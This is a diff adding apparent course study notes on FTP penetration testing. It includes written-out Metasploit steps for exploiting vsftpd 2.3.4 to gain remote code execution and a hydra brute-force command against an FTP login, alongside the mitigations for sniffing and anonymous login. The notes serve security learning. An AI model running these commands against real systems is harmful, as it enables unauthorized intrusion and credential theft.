@@ -105,3 +105,26 @@ vulnerability scanning
     sydo systemctl start nessusd.service // he chose nessus essentials
       in the website he chose basic essentials scan
         target: victim ip
+
+pentesting ftp
+  port 21 // send commands, such as using ls
+  port 20 // used for transfering files
+  demo:
+  ftp test.rebex.net
+  username: ftp
+  ls
+  get readme.txt
+  attacks:
+    -sniffing ftp, mitigation use ftps or sftp
+    -anonymous login // no authentication, sometimes username anonymous and empty pass works
+    -CVE
+      nmap ipaddress -p 21 -sV // got the version vsftpd 2.3.4
+      msfconsole
+      search vsftpd
+      use 1
+      show options
+      set RHOST
+      run // here we get rce
+    -bruteforce
+      tool: hydra
+        hydra -l admin -P pass.txt ftp://192.168.0.136 // he tried -I so look for this option
